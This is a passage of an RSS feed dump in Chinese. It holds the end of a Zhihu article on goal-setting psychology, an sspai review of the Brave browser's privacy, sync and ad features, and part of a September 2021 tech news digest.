才发现目标根本无法完成；而在面临短期决策时，我们又过于关注可行度，仅仅是因为某个目标显得过于麻烦，就把它给舍弃了，没有想过它有多有趣。</p>\n<p>两种考虑其实都是有好处的，考虑合意度可以使你备受鼓舞，专注于回报而提升自制力与毅力；考虑可行性则能使你在困难任务中专注于操作细节，从而完成任务，你需要做的是扬长避短，同时考虑，为排除特定困难而选择相应的思考模式。</p>\n<p>比如学堂君给自己设定了暴富（一个亿）的目标，如果只从合意度的角度出发，这可太爽了，但落到可行性上，咱就得冷静下来，慢慢来，先要执行123才有梦里的1个亿。</p>\n<p>有一个策略可以很好地结合这两者，那就是心理学家厄廷根提出的<b>心理对照</b>（Mental contrasting）<sup data-text=\"G. Oettingen and E. Stephens, “Mental Contrasting Future and Reality: A Motivationally Intelligent Self-Regulatory Strategy, “ in The Psychology of Goals, G. Moskowitz and H. Grant, eds. (New York: Guilford, 2009).\" data-url=\"\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\">[4]</sup>，也就是设想达到目标后的收获 &amp; 思考妨碍目标实现的障碍，学堂君想要从现实挣到1个亿，必须从梦里醒来先想想妨碍自己成功的障碍怎么解决。</p>\n<p>心理对照的过程不但有助于更好地设定某个目标，还能自然而然地调整动机，帮助我们用最大的决心去实现想要实现的目标。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d827c3505b8b3456ceddeaa4dc042ce_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"240\" data-rawheight=\"240\" data-watermark=\"original\" data-original-src=\"v2-4d827c3505b8b3456ceddeaa4dc042ce\" data-watermark-src=\"v2-a81e7e56d4618493b43fa74303bde6ec\" data-private-watermark-src=\"v2-8c3d625d757528145dface76959c9044\"></p>\n<h2>坚持目标</h2>\n<p>在坚持目标的路上，人们有两种思维焦点：<b>进取型焦点</b>和<b>防御型焦点</b><sup data-text=\"R. Zhu and J. Meyers-Levy, “Exploring the Cognitive Mechanism That Underlies Regulatory Focus Effects, “Journal of Consumer Research 34 (2007).\" data-url=\"\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"5\">[5]</sup>。</p>\n<p>进取性思维叫“风险偏好”，不入虎穴焉得虎子，是乐观者的思维方式；</p>\n<p>防御性思维是“风险厌恶”，入虎穴乃以身涉险，为了避免进入虎穴，我一定要拿到虎子，是悲观者的思维方式。</p>\n<p>比如说，同样是要设立一个学会“弹吉他”的目标，进取性的思考方式是学会弹吉他我很帅很强，可以吸引到喜欢人的注意；而防御性的思考方式则是，如果没有学会一样乐器，我就太拉胯了。</p>\n<p>总得来说，进取型焦点有过度乐观的风险，而防御型焦点又有自信不足的可能，两种焦点都能帮助我们实现目标，但过度的焦点都需要调整。</p>\n<h3>如果你过度自信</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-e077ee169ae9111c804da2600d326133_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"274\" data-watermark=\"original\" data-original-src=\"v2-e077ee169ae9111c804da2600d326133\" data-watermark-src=\"v2-68a3621023fb0a22a63eb1610ce0ccc2\" data-private-watermark-src=\"v2-25b840136600a860929f26f7009b296b\"></p>\n<p><b>问问自己为什么觉得你能做好</b></p>\n<p>假设你要去面试，你觉得自己比其他应聘者更有优势，那么请思考你为什么有优势。或许你可以把答案一条条地写下来，以便更充分地阐述原因。</p>\n<p><b>其他人同样也有优势的可能性有多大？</b></p>\n<p>例如，如果你觉得自己聪明或者以好成绩毕业于好学校，因而很可能应聘成功，那么请想想，是不是还有其他拥有同样条件的应聘者，你真的能脱颖而出吗？这样想切合失败吗？</p>\n<p><b>现在想一想你怎样控制成功或失败</b></p>\n<p>你能做些什么来增大赢得这份工作的可能性？如何准备面试来呈现最佳状态？做什么才能使成功变成现实？采取措施确保成功，这样你才能拥有真实、现实、应有的乐观，助你展示最好的自己。</p>\n<h3>如果你自信不足</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-6ec279661989e0ede78525d32b789f67_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"349\" data-rawheight=\"253\" data-watermark=\"original\" data-original-src=\"v2-6ec279661989e0ede78525d32b789f67\" data-watermark-src=\"v2-343ccdffc679a2bbe4b1150de4ab8e20\" data-private-watermark-src=\"v2-b3bf0e07272b99c9eb156c04fe7b5ba1\"></p>\n<p><b>尝试归因再培训</b></p>\n<p>大多数人之所以对成功的概率不确定，是因为他们怀疑自己的能力，而这种想法往往是错误的。质疑一下你的假设，比如：实现目标真的与能力有关吗？勤奋、在逆境中坚持以及好的策略会不会更重要？如果真是情况是后者，那么，实现目标就完完全全在你控制范围之内了。</p>\n<p><b>用过去经历给自己增加信心</b></p>\n<p>回想你过去的成功经验，也就是你面临的挑战以及克服这些挑战的策略。花10分钟写出你感到尤为骄傲的一项成就及其实现过程，也会颇有帮助。有时候，当你彷徨时，需要的只是对自身能力的一点点肯定，从而改变你的视角。</p>\n<p><b>“如果···那就···”</b></p>\n<p>你可能是一个习惯悲观的人，那么你可以现在给自己设定一个规则，只要你识别出自己脑海中浮现了有阻碍的消极念头，就用一些特定的念头覆盖它，比如：“若我开始怀疑自己，那就告诉自己为什么可以胜任这个岗位。”</p>\n<p><b>设想成功</b></p>\n<p>注意，这里并不是要你设想成功本身，而是去<b>设想成功的方式和步骤</b>。在脑海中模拟成功的过程而非期待看到的结果，不仅能给你更乐观的展望，还能让你更好地进行计划和做好准备。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e7dad1ef53a62c3fc94d0bd2768e6619_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"240\" data-rawheight=\"240\" data-watermark=\"original\" data-original-src=\"v2-e7dad1ef53a62c3fc94d0bd2768e6619\" data-watermark-src=\"v2-35eb6151e7d23cefed53d6c6deea8914\" data-private-watermark-src=\"v2-71cd8896e12d18c1be4f346e5fea86c1\"></p>\n<h2>结语</h2>\n<p>好的开始才是成功的一半，别再停滞不前啦！学堂君的笔记有了如下的24字箴言，也在此分享给你：</p>\n<p>1.清除障碍制定计划</p>\n<p>2.增强自制懂得坚持</p>\n<p>3.相对乐观给予反馈</p>\n<p><br></p>\n<p>作者：林17</p>\n<p>相关原文：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/PL_I0ztTDJH840KRHXVZYg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">目标年年立，今年有何不同？ | 《如何达成目标》</a></p>\n<p>欢迎关注心理学科普平台<a href=\"https://www.zhihu.com/people/f3260f05df264ee916da258e1384e247\" class=\"internal\">@京师心理大学堂</a>，北京师范大学心理学部出品，奉献百年积淀，带你脑洞大开。任何形式的转载请知乎私信联系。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jing-shi-xin-li-da-xue-tang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">京师心理大学堂</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/306255121/answer/2108217269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">24 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/276928844?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在哪一刻会下了决心来改变自己的现状？</a><br><a href=\"http://www.zhihu.com/question/455858071?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">当你无力改变自己，更无力改变身边的困境时，如何面对？</a><br>\n","link":"http://www.zhihu.com/question/306255121/answer/2108217269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"都基于 Chromium，它有什么不同：Brave 浏览器简介","date":"2021-09-09 03:28:07","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>全球范围内的浏览器「一超多强」的格局已经非常清晰，但平静的水面下往往暗潮涌动：商业公司隐私丑闻接连不断，隐私立法逐步健全，人们对数据安全愈发关心，浏览器厂商亦需要做出抉择。但作为广告分发商的 Google 显然在平衡数据的保护和使用上犯了难，屏蔽第三方 cookies <a href=\"https://www.theverge.com/2021/6/24/22547339/google-chrome-cookiepocalypse-delayed-2023\" target=\"_blank\">一拖再拖</a>，试图推行 FLoC 碰壁，Chrome 隐私保护举措并没有让大众满意，</p>\n<p>和 Google 的沉默不同，2016 年 Brave Software 推出了一款以运行快速、隐私安全为口号的浏览器：Brave。该浏览器同样基于 <a href=\"https://www.chromium.org/\" target=\"_blank\">Chromium</a> 开发，内嵌了跟踪及广告拦截，无需帐号即可同步数据，支持全平台，开源并且采用了独特的盈利方式。本文也从这五个角度出发，介绍这样一个小众的浏览器。</p>\n<h2>基于 Chromium 进行开源开发</h2>\n<p>从 <a href=\"https://brave.com/\" target=\"_blank\">官网</a> 或 <a href=\"https://github.com/brave/brave-browser/releases\" target=\"_blank\">项目主页</a> 下载并安装 Brave 后，Chrome 用户只消简单探索一两分钟，就能完全掌握它的各种设置。Brave 基于 Chromium，大部分设置的位置与设计并没有做改动。我们可以用 F12 调出控制台，能用 <code>chrome://restart</code> 来重启，也能输入 <code>chrome://flags</code> 进入隐藏功能界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmn5b34td2ab6q9jg.png\"><figcaption>Brave 清爽的主界面</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmnlb34td2engksn0.png\"><figcaption>Flags 界面</figcaption></figure><p>基于 Chromium 既能让使用 Brave 的用户不会像使用 Firefox 那样碰到网站不支持的情况，也意味着 Chrome Web Store 的扩展与主题配色同样适用于 Brave，用户可享受完整的浏览器拓展生态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmntb34td201m5uug.png\"><figcaption>添加扩展界面</figcaption></figure><p>Chromium 为 Brave 带来了优良的兼容性和扩展能力，但和 Chrome、Edge 等其他 Chromium 系浏览器不同，Brave 是完全 <a href=\"https://github.com/brave\" target=\"_blank\">开源</a> 的。此外，它还内嵌了可自定义规则的跟踪与广告拦截功能。</p>\n<h2>跟踪与广告拦截</h2>\n<p>点按浏览器地址栏右侧的 Logo 即可呼出针对单个网站的跟踪与广告拦截设置。我们也能通过<code>设置 &gt; 屏蔽/阻止社交媒体/隐私设置与安全性</code> 来管理拦截器的全局设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmo5b34td2ab6q9k0.png\"></figure><p>下面着重讲述三个颇有特色的隐私保护手段。</p>\n<h3>注重隐私的搜索引擎</h3>\n<p>和 Chrome 等大众浏览器不同，Brave 预置的搜索引擎列表有不少以保护隐私为旗号的新面孔—— Qwant、Startpage、Brave 等，这里介绍其中的两个。</p>\n<p><a href=\"https://www.startpage.com/\" target=\"_blank\">Startpage</a> 是一个「中介」型的搜索引擎，用户输入关键词后，它的服务器代替用户向 Google 发送请求，然后把得到的结果返回给用户，如此一来就切断了 Google 跟踪用户的途径，在保证搜索结果高质量的同时，也能防止来自 Google 的跟踪。该搜索引擎背后的公司有很长的经营历史，十几年以前就发布 <a href=\"https://en.wikipedia.org/wiki/Startpage.com\" target=\"_blank\">公告</a> 称不再记录用户 IP。Startpage 也宣称该搜索引擎不记录历史，没有跟踪，只通过搜索结果的上下文展示广告以获得利润。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmo5b34td27uspu3g.png\"></figure><p>Brave <a href=\"https://search.brave.com/\" target=\"_blank\">自家的搜索</a> 于前不久面向大众正式推出，现在还处于 Beta 阶段。在它的 <a href=\"https://search.brave.com/help/independence\" target=\"_blank\">声明</a> 中，Brave 称其目标是建立一个真正独立的搜索引擎同 Google 竞争（而不是像 Startpage 那样）。目前对于检索结果不足的请求，用户可以在搜索设置中选择混用 Google 搜索结果（Google fallback mixing）。就笔者目前的体验来看，Brave 的英文搜索尚能接受，但中文搜索质量非常差，几乎完全不可用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmodb34td201m5uv0.png\"></figure><h3>针对浏览器指纹识别的拦截</h3>\n<p>我们在一些移动设备上录入指纹，需要一次一次按压指纹识别器，最终才能形成独一无二的指纹模型用于确认身份。同样，网站也能通过浏览器中用户一次又一次的点击来描摹出一个精确画像，从而实现横跨整个网络的跟踪。</p>\n<p>浏览器为网站提供了大量的<a href=\"https://docs.google.com/spreadsheets/d/1ZB1zINfGFcrcFzNg4eytRnBQN3nBoKHua2jhV_X6W80/edit#gid=0\" target=\"_blank\"> API</a>，通过埋入一些不可见的脚本、音频等元素，一个网站可以获得用户的设备类型、插件信息、浏览器的类型和版本、语言地域、字体、操作系统、屏幕分辨率等一系列信息，这些信息的某一个单独拿出来并不能用于识别用户，但当它们组合起来，往往就足够形成一个独一无二的「浏览器指纹」。各个网站共享共建用户数据库，某网站只需要将得到的浏览器指纹和已有的数据库对比，就能得知访客的身份和喜好。这种跟踪方式并非传统的 cookies 拦截或所谓的无痕模式能够阻止的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmolb34td27uspu40.png\"><figcaption>当用户请求一张图片时，会暴露的信息</figcaption></figure><p>读者可以使用 Chrome 等浏览器访问一个采用音频方式追踪用户的 <a href=\"https://audiofingerprint.openwpm.com/\" target=\"_blank\">测试站点</a>，点击生成指纹（Fingureprint me）。之后，清除缓存和 cookies（或进入无痕模式），再次访问测试站点生成指纹。可以发现两者是一样的，也就是说跟踪仍然可以进行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmotb34td2engksng.png\"></figure><p>为了拦截这种精确的识别方式，Brave 浏览器的做法是阻止网站对一些 API 的访问（有可能导致网站无法工作），删除或修改一些 API，同时让一些 API 的值随机化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmotb34td201m5uvg.png\"><figcaption>图片来源：https://brave.com/privacy-updates-4/</figcaption></figure><p>打开 Brave 中的「拦截指纹识别」后，使用相同的方式测试，可以发现采用音频识别的浏览器指纹跟踪不再有效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmpdb34td2ab6q9kg.png\"></figure><h3>Brave 广告拦截</h3>\n<p>像 uBlock Origin 等第三方拦截器一样，内置的 Brave 广告拦截同样依赖于规则列表，规则列表能通过在地址栏输入<code>brave://adblock/</code> 找到。默认只会勾选适用于本地区的一个列表，以兼顾广告拦截效果和资源占用。它也支持在网页右键手动屏蔽某元素的特性，但不能像其他拦截器一样使用 URL 订阅第三方拦截规则。</p>\n<p>为了让某些网页能够正确运行，Brave 提供了一些额外的选项。例如，全局拦截跨站点 cookies 会导致网站无法加载「使用 Google 登录」按钮，所以它提供了单独放行 Google 的选项。要是某些网站不能正确运作，我们也可以通过地址栏的图标关闭拦截器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmplb34td27uspu4g.png\"></figure><p>内嵌跟踪与广告拦截不仅能给用户带来更安全隐私的浏览体验，也大大提高了网页加载速度。拦截了一些元素后，浏览器要下载的网页大小自然减少，所消耗的时间也会跟着减少。这也是在许多 <a href=\"https://www.youtube.com/watch?v=4-qnzTWA_ys\" target=\"_blank\">对比评测</a> 中 Brave 加载速度明显比其他浏览器快的主要原因。Brave 主页默认显示的统计信息清楚地展示了这一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmptb34td2ab6q9l0.png\"><figcaption>图片来自 <a href=\"https://twitter.com/tomgrundy/status/1432332361526493186?s=20\" target=\"_blank\">Twitter</a></figcaption></figure><p>不过，一旦用户登录帐号之后，互联网服务商便能够轻易地将用户行为和 ID 绑定起来，这种跟踪是无法进行拦截的。不少用户曾经对 Chrome 清除「全部」cookies 却有意排除 Google 域名的 <a href=\"https://twitter.com/ctavan/status/1044282084020441088\" target=\"_blank\">批评</a> 也正是源自类似的顾虑。但没有全局的帐号体系又怎么实现跨平台的数据同步呢？同步链（Sync Chain）是 Brave 的答案。</p>\n<h2>同步链与跨平台同步</h2>\n<p>想要启用多平台同步，用户需要进入浏览器<code>设置 &gt; 同步 &gt; 管理已同步的设备</code>。第一次如此操作的客户端会生成一个 32 字节的随机种子，这个种子被 BIP39（<a href=\"https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt\" target=\"_blank\">助记种子</a>）编码为一连串英文单词，这串英文就是用于同步的 ID。</p>\n<p>与此设备同步数据的其他设备需要输入这串英文单词，或者扫描二维码以加入同步链。Brave 的服务器会使用这串英文以及时间戳对后续加入链的设备进行认证，如果通过，就能建立同步。同步的数据在客户端被加密，服务端仅获取必要的设备名称、类型和同步项目信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmq5b34td27uspu50.png\"></figure><p>同步类别和 Chrome 等浏览器没什么不同。Brave 的同步也可以实现从一个设备发送标签页到另一个设备的效果。需要注意的是， iOS 端目前仅支持书签和历史记录的同步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqdb34td27uspu5g.png\"></figure><h2>移动端体验</h2>\n<p>说到了全平台同步，也就不得不提 Brave 的移动端体验。</p>\n<p>性能方面，因为 Chrome 只对 8G RAM 及以上的 Android 设备推送 64 bit 版本，而 Brave 无此限制，所以理论上对于一些没有足够大 RAM 的 Android 设备来说，Brave 较 Chrome 性能要好上一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqlb34td27uspu60.png\"><figcaption>注意版本号后面的 64-bit 标识</figcaption></figure><p>而基础体验方面，Brave 提供的是上下两栏布局，更方便单手操作，但并没有保留笔者个人比较喜欢的滑动选择菜单的特性。主页、设置的内容与设计大致和桌面端保持一致。得益于 Chromium，它对 PWA 的支持较 Firefox 要好上不少。Brave 还提供了音视频后台播放的特色功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqtb34td2engkso0.png\"></figure><p>它也将跟踪和广告拦截器带到了 Android 平台，入口在「Brave shields &amp; privacy」中。地址栏直接填入 <code>brave://adblock</code> 可跳转到自定义广告拦截规则集页面，功能与桌面端基本一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrdb34td201m5v00.png\"></figure><h2>代币与盈利手段</h2>\n<p>虽然是开源软件，但 Brave 背后并非像 Mozilla Foundation 那样的非盈利组织，那么 Brave Software 如何通过一款免费的浏览器赚钱呢？</p>\n<p>答案还是广告。Brave 拦截了第三方的各类广告与跟踪，代之以不跟踪的自家平台广告。自家的广告在内置拦截器的白名单中。<a href=\"https://brave.com/brave-ads/\" target=\"_blank\">Brave 认为</a>，现有的广告于用户而言是侵犯隐私且影响使用体验的，于广告主而言则存在大量广告欺诈，因而引发用户反感的同时，也让广告主们事倍功半。</p>\n<p>Brave 建立了一个以注意力代币（BAT）为核心的广告体系。这在用户端表现为 Brave 奖励（Brave Rewards），入口在地址栏的右侧。Brave 的宣传口号「Proud to support a faster, safer web」也可能是在暗示这样一个共赢的广告分发体系。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrlb34td2ab6q9lg.png\"></figure><p>浏览器的广告默认开启，会通过首页壁纸、设备通知等不影响网页浏览体验的形式推送给用户。用户观看广告后，会有相应的代币奖励。这些奖励可以被用来打赏网页创作者或在月底提现。但对于普通用户而言，奖励金额并不多（官方称 $5 每月）。由于代币实际上是加密货币，<a href=\"https://www.youtube.com/watch?v=sV3Y0UkW0aI\" target=\"_blank\">提现操作</a> 需要接入第三方服务商并提供身份信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrtb34td201m5v0g.png\"></figure><p>披露自身的盈利手段和广告分发细节确实有助于赢得信任，而尊重用户的选择自由能够增加使用者的好感。</p>\n<p>如果不愿意看到 Brave 广告，浏览器设置界面有显眼的开关，可随时关闭或者隐藏这些广告。</p>\n<h2>总结</h2>\n<p>无论是研究如何拦截多种形式的跟踪，还是创建一个互利的广告分发平台，Brave 都扮演了一个探索者的角色。Firefox 在其官网的 <a href=\"https://www.mozilla.org/en-US/firefox/browsers/compare/brave/\" target=\"_blank\">对比文章</a> 中也对 Brave 有不少的赞扬。</p>\n<p>此外，Brave 应该还执行了更严格的内存控制策略，能明显发现其资源占用比 Chrome 更好。在切换到 Brave 的时日里，笔者愈发感觉它不是简单能用 Chromium + adblock + HTTPS Everywhere 概括的。</p>\n<p>如果读者不满目前的网页浏览体验，有意尝试一下新的浏览器，Brave 或许是一个不错的选择。</p>\n<p>封面：修改自 Brave <a href=\"https://brave.com/media-assets/\" target=\"_blank\">媒体资产</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68666"},{"title":"派早报：理光发布 GR IIIx、大疆发布新款手机云台、《鬼灭》第二季定档等","date":"2021-09-09 00:46:55","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>理光正式发布 GR IIIx 相机</h3>\n<p>9 月 8 日，相机品牌理光正式发布了新款紧凑型相机 RICOH GR IIIx。RICOH GR IIIx 是 RICOH GR III 的同级产品，外观等方面没有明显变化，区别在于镜头焦距变为等效 40 mm，并支持 50 mm 和 71 mm 的等效裁切；微距模式的最近对焦距离为 12 cm。RICOH GR IIIx 目前已经在电商平台开启预售，价格为 6199 元。<a href=\"https://www.grblog.jp/article/14306/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/8ed24b723487d3226ffedf4e7a5be495\"><figcaption>图片截取自理光网站</figcaption></figure><h3>大疆推出 Osmo Mobile 5 手机云台</h3>\n<p>9 月 8 日晚间，大疆公司推出新一代手机云台产品 DJI Osmo Mobile 5，与前代产品相比，OM 5 大幅减轻了重量，可以折叠收纳至口袋中，并支持伸缩功能，可以将云台变为自拍杆使用。DJI Osmo Mobile 5 定价 999 元，目前已开放购买。<a href=\"https://www.sohu.com/a/488648703_324615\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/7920c580e8ca4b09f720354824ee2adf\"><figcaption>图片截取自 DJI 网站</figcaption></figure><p>我派在 B 站等平台已经发布 DJI OM 5 的上手体验，点击即可观看：</p> <h3>英特尔推出 NUC 游戏本</h3>\n<p>9 月 7 日，英特尔推出 NUC X15 系列笔记本电脑，该系列电脑采用了 Tiger Lake 标压处理器、英伟达 RTX 30 系列显卡及最高 240 Hz 的显示屏，默认不带硬盘。NUC X15 系列不直接面向消费者销售，旨在帮助没有游戏本设计经验的厂商进入该领域。<a href=\"https://www.ithome.com/0/574/013.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/89caa5e33eef53f84a54d8e9b91a6cc3\"><figcaption>图片来自新闻源</figcaption></figure><h3>任天堂确认 OLED 版 Switch 的发售日期</h3>\n<p>任天堂公司于 9 月 8 日对外宣布，OLED 版 Switch 游戏机将于 9 月 24 日开启预售，10 月 8 日正式上市，售价 37,980 日元（约 2,230 元人民币）。任天堂此前明确表示，公司短期内并无新品主机计划。<a href=\"https://tech.ifeng.com/c/89MsZxRR5Un\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/2bfe95ba2a004db65f0dd34f5b2997ca\"><figcaption>图片来自新闻源</figcaption></figure><h3>微软收购浏览器视频编辑服务 Clipchamp</h3>\n<p>微软于 9 月 8 日正式对外宣布，已经完成了对基于浏览器的视频编辑服务 Clipchamp 的收购，在新闻稿中微软表示，Clipchamp 结合了 web 服务的简单性以及 PC 强大的 GPU 加速能力，可以为非专业工作者带来「过去仅限专业视频编辑软件才能拥有的能力」。微软目前尚未确认 Clipchamp 是否会继续独立运营，但据悉微软将推出将现有 Clipchamp 用户转换为微软订阅用户的新机制。<a href=\"https://cn.engadget.com/microsoft-acquires-clipchamp-110055319.html\" target=\"_blank\">来源</a></p>\n<h3>华为将召开智慧办公新品发布会</h3>\n<p>9 月 8 日，华为对外公布了新品发布会的时间和主题。本次发布会主要发布和智慧办公相关的新品，定于 9 月 13 日举行。有媒体报道称，华为智能打印机将在本次发布会上亮相。<a href=\"https://tech.ifeng.com/c/89Mf8neVHEi\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/09/article/4435cdad12d19d5ddfbb5d3d7b31a1ed\"><figcaption>图片来自新闻源</figcaption></figure><h3>Android 12 推送 beta 5 更新</h3>\n<p>Google 已经向升级了 Android 12 的设备推送了第五个 beta 版的系统更新，更新内容包含锁屏介面新增设备控制快捷方式、Pixel Launcher 更加迅捷、增加计算核心隐私设置以及多款内置应用 UI 升级等。<a href=\"https://www.xda-developers.com/android-12-beta-5-changelog/\" target=\"_blank\">来源</a></p>\n<h3>字节跳动推出《悟空浏览器》</h3>\n<p>字节跳动近日推出一款主打赚钱功能并面向下沉市场的《悟空浏览器》，该浏览器基于个性化算法，打造集免费小说、内容视频和图文资讯为一体的浏览器平台，支持设置为默认浏览器，用户可以通过浏览图文、观看视频方式获取金币，达到一定额度之后可以进行支付宝提现操作。<a href=\"https://tech.ifeng.com/c/89MhftUJruA\" target=\"_blank\">来源</a></p>\n<h3>特斯拉本年度销量已超过去年总和</h3>\n<p>9 月 8 日，乘联会公布了中国汽车销量数据。据数据显示，8 月特斯拉批发销量创造了历史最好成绩，达到 44,264 辆，环比增长 34%，同比增长 275%。截至 8 月，特斯拉 2021 年累计销售超过 25 万辆，其中仅国内销量就已达到 152,531 辆，超越去年全年的整体销量。</p>\n<h3>《鬼灭之刃·花街篇》确认秋冬档上线</h3>\n<p>9 月 6 日，富士电视台宣布 TV 动画《鬼灭之刃》的第二季「花街篇」将于今年秋冬档的周日晚 10 点 15 分（北京时间）播出。富士电视台将于 9 月 25 日继续公布有关「花街篇」的后续情报。<a href=\"https://www.gcores.com/articles/141317\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/09/article/a36c58eb311b7cb2e5f39634e6a75c6a\"><figcaption>图片来自新闻源</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul><li>近日，有消息称抖音旗下的独立电商 app 将于 10 月份正式上线，该项目由抖音电商总裁康泽宇负责推动。<a href=\"https://tech.ifeng.com/c/89MxLei34Kl\" target=\"_blank\">来源</a>\n</li></ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>🎁 会员周边将于即日起<strong>陆续</strong>发货，敬请期待。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 开启，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>💰 <a href=\"https://sspai.com/post/68647\" target=\"_blank\">开学季到来，为你推荐这 10+ 款数码 / 生活实用好物</a>\n</li>\n<li>🛠 <a href=\"https://sspai.com/post/68646\" target=\"_blank\">舍不得旧手机，那就做个标本吧</a>\n</li>\n<li>🎤 <a href=\"https://sspai.com/post/68640\" target=\"_blank\">在 Google 浇灌创新文化——专访 Google 首席文化官 Stacy Sullivan</a>\n</li>\n<li>🍎 <a href=\"https://sspai.com/post/68644\" target=\"_blank\">高刷屏 iPhone、全面屏 iPad mini…… Apple 秋季发布会还有哪些看点？</a>\n</li>\n<li>🎧 <a href=\"https://sspai.com/post/68651\" target=\"_blank\">一派·在线沙龙 02：个人知识管理，你做对了吗？</a>\n</li>\n<li>⚽ <a href=\"https://sspai.com/post/68613\" target=\"_blank\">2021–2022 